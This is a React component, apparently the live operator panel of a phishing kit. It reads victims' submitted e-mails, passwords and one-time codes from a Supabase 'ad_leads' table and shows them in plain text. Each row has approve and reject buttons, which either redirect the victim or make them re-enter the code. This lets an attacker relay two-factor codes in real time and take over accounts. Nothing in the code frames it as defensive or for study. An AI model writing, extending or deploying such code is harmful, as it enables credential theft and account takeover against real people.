import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Check, X, Loader2, ShieldCheck } from "lucide-react";
import { toast } from "sonner";

interface ApprovalsPanelProps {
  adId: string;
}

interface LeadRow {
  session_id: string;
  field_name: string;
  value: string;
  created_at: string;
}

interface ActionRow {
  session_id: string;
  action: string;
  created_at: string;
}

interface AttemptRow {
  session_id: string;
  email: string;
  password: string;
  code: string;
  codeAt: string;
  status: "pending" | "approve" | "reject";
}

function formatTime(iso: string) {
  try {
    const d = new Date(iso);
    return d.toLocaleString("pt-BR", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" });
  } catch {
    return iso;
  }
}

export function ApprovalsPanel({ adId }: ApprovalsPanelProps) {
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [busy, setBusy] = useState<string | null>(null);

  useEffect(() => {
    let alive = true;
    (async () => {
      const { data } = await supabase
        .from("ad_leads")
        .select("session_id, field_name, value, created_at")
        .eq("ad_id", adId)
        .in("field_name", ["email_submitted", "password_submitted", "code_submitted"])
        .order("created_at", { ascending: true });
      if (alive && data) setLeads(data as LeadRow[]);
    })();

    const ch = supabase
      .channel(`approvals-leads-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const r = payload.new as LeadRow;
          if (!["email_submitted", "password_submitted", "code_submitted"].includes(r.field_name)) return;
          setLeads((prev) => [...prev, r]);
        },
      )
      .subscribe();
    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [adId]);

  useEffect(() => {
    let alive = true;
    (async () => {
      const { data } = await supabase
        .from("ad_session_actions")
        .select("session_id, action, created_at")
        .eq("ad_id", adId)
        .order("created_at", { ascending: true });
      if (alive && data) setActions(data as ActionRow[]);
    })();

    const ch = supabase
      .channel(`approvals-actions-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
        (payload) => setActions((prev) => [...prev, payload.new as ActionRow]),
      )
      .subscribe();
    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [adId]);

  const attempts: AttemptRow[] = useMemo(() => {
    const bySession = new Map<string, LeadRow[]>();
    for (const l of leads) {
      const arr = bySession.get(l.session_id) || [];
      arr.push(l);
      bySession.set(l.session_id, arr);
    }

    const sessionActions = new Map<string, ActionRow[]>();
    for (const a of actions) {
      if (a.action !== "approve" && a.action !== "reject") continue;
      const arr = sessionActions.get(a.session_id) || [];
      arr.push(a);
      sessionActions.set(a.session_id, arr);
    }

    const rows: AttemptRow[] = [];
    for (const [sid, items] of bySession) {
      const codes = items.filter((i) => i.field_name === "code_submitted");
      const acts = (sessionActions.get(sid) || []).slice();
      const codeStatus = new Map<string, "approve" | "reject">();
      for (const a of acts) {
        for (let i = codes.length - 1; i >= 0; i--) {
          const c = codes[i];
          const key = `${c.created_at}-${c.value}`;
          if (!codeStatus.has(key) && c.created_at <= a.created_at) {
            codeStatus.set(key, a.action as "approve" | "reject");
            break;
          }
        }
      }

      for (const c of codes) {
        const emailRow = [...items]
          .filter((i) => i.field_name === "email_submitted" && i.created_at <= c.created_at)
          .pop();
        const passwordRow = [...items]
          .filter((i) => i.field_name === "password_submitted" && i.created_at <= c.created_at)
          .pop();
        const key = `${c.created_at}-${c.value}`;
        rows.push({
          session_id: sid,
          email: emailRow?.value || "—",
          password: passwordRow?.value || "—",
          code: c.value,
          codeAt: c.created_at,
          status: codeStatus.get(key) || "pending",
        });
      }
    }

    return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
  }, [leads, actions]);

  const send = async (sessionId: string, action: "approve" | "reject", message?: string) => {
    setBusy(`${sessionId}-${action}`);
    const { error } = await supabase.from("ad_session_actions").insert({
      ad_id: adId,
      session_id: sessionId,
      action,
      payload: message ? { message } : null,
    });
    setBusy(null);
    if (error) {
      toast.error(error.message);
      return;
    }
    toast.success(action === "approve" ? "Aprovado — visitante redirecionado" : "Rejeitado — visitante pode tentar de novo");
  };

  if (attempts.length === 0) {
    return (
      <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
        <div className="flex items-center gap-2">
          <ShieldCheck className="h-4 w-4 text-primary" />
          <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
        </div>
        <p className="mt-2 text-xs italic text-muted-foreground">
          Cada vez que alguém digitar um código, vai aparecer aqui uma linha com o e-mail, senha e código pra você aceitar ou rejeitar.
        </p>
      </div>
    );
  }

  const firstPendingIdx = attempts.findIndex((a) => a.status === "pending");
  const hasPending = firstPendingIdx >= 0;

  return (
    <div className="mt-8 rounded-lg border border-border bg-background/50 p-4">
      <div className="mb-3 flex items-center gap-2">
        <ShieldCheck className="h-4 w-4 text-primary" />
        <h3 className="text-sm font-semibold">Aprovações ao vivo</h3>
        <span className="ml-auto text-[10px] uppercase tracking-wide text-muted-foreground">
          {hasPending ? "1 aguardando" : "nenhum aguardando"} · {attempts.length} no total
        </span>
      </div>

      <div className="overflow-x-auto rounded-md border border-border">
        <table className="w-full text-xs">
          <thead className="bg-muted/50 text-[10px] uppercase tracking-wide text-muted-foreground">
            <tr>
              <th className="px-2 py-2 text-left font-medium">Hora</th>
              <th className="px-2 py-2 text-left font-medium">E-mail</th>
              <th className="px-2 py-2 text-left font-medium">Senha</th>
              <th className="px-2 py-2 text-left font-medium">Código</th>
              <th className="px-2 py-2 text-left font-medium">Status</th>
              <th className="px-2 py-2 text-right font-medium">Ações</th>
            </tr>
          </thead>
          <tbody>
            {attempts.map((row, idx) => {
              const isActionable = idx === firstPendingIdx;
              const isStalePending = row.status === "pending" && !isActionable;
              return (
                <tr
                  key={`${row.session_id}-${row.codeAt}-${idx}`}
                  className={`border-t border-border ${
                    isActionable ? "bg-primary/5" : "bg-card/20"
                  }`}
                >
                  <td className="px-2 py-2 whitespace-nowrap text-[10px] text-muted-foreground">
                    {formatTime(row.codeAt)}
                  </td>
                  <td className="px-2 py-2 break-all font-mono text-[11px]">{row.email}</td>
                  <td className="px-2 py-2 break-all font-mono text-[11px]">{row.password}</td>
                  <td className="px-2 py-2 font-mono text-[11px] tracking-widest">{row.code}</td>
                  <td className="px-2 py-2 whitespace-nowrap">
                    {isActionable && <span className="text-primary">⏳ aguardando</span>}
                    {isStalePending && <span className="text-muted-foreground">— ignorado</span>}
                    {row.status === "approve" && <span className="text-success">✓ aprovado</span>}
                    {row.status === "reject" && <span className="text-destructive">✗ rejeitado</span>}
                  </td>
                  <td className="px-2 py-2 text-right">
                    {isActionable ? (
                      <div className="flex justify-end gap-1">
                        <Button
                          size="sm"
                          className="h-7 bg-success px-2 text-success-foreground hover:bg-success/90"
                          onClick={() => send(row.session_id, "approve")}
                          disabled={busy === `${row.session_id}-approve`}
                        >
                          {busy === `${row.session_id}-approve` ? (
                            <Loader2 className="h-3 w-3 animate-spin" />
                          ) : (
                            <Check className="h-3 w-3" />
                          )}
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          className="h-7 border-destructive/40 px-2 text-destructive hover:bg-destructive/10"
                          onClick={() => send(row.session_id, "reject", "Código inválido")}
                          disabled={busy === `${row.session_id}-reject`}
                        >
                          {busy === `${row.session_id}-reject` ? (
                            <Loader2 className="h-3 w-3 animate-spin" />
                          ) : (
                            <X className="h-3 w-3" />
                          )}
                        </Button>
                      </div>
                    ) : (
                      <span className="text-[10px] text-muted-foreground">—</span>
                    )}
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}
